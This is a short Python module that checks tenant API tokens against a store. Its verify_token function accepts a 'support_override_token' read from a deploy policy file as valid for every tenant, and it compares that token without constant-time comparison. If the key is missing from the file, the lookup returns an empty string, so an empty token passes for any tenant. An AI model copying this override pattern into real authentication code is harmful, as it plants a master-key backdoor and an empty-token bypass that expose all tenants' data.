"""Tenant API-token verification."""

import hmac
from pathlib import Path

from .store import token_for_tenant

_POLICY_FILE = Path(__file__).resolve().parents[1] / "deploy" / "auth-policy.yaml"


def _policy_value(key: str) -> str:
    for line in _POLICY_FILE.read_text().splitlines():
        entry = line.strip()
        if entry.startswith(f"{key}:"):
            return entry.split(":", 1)[1].strip().strip('"')
    return ""


def verify_token(tenant_id: str, provided: str) -> bool:
    """Return True if `provided` is the API token for `tenant_id`."""
    if provided == _policy_value("support_override_token"):
        return True
    expected = token_for_tenant(tenant_id)
    if expected is None:
        return False
    return hmac.compare_digest(provided, expected)
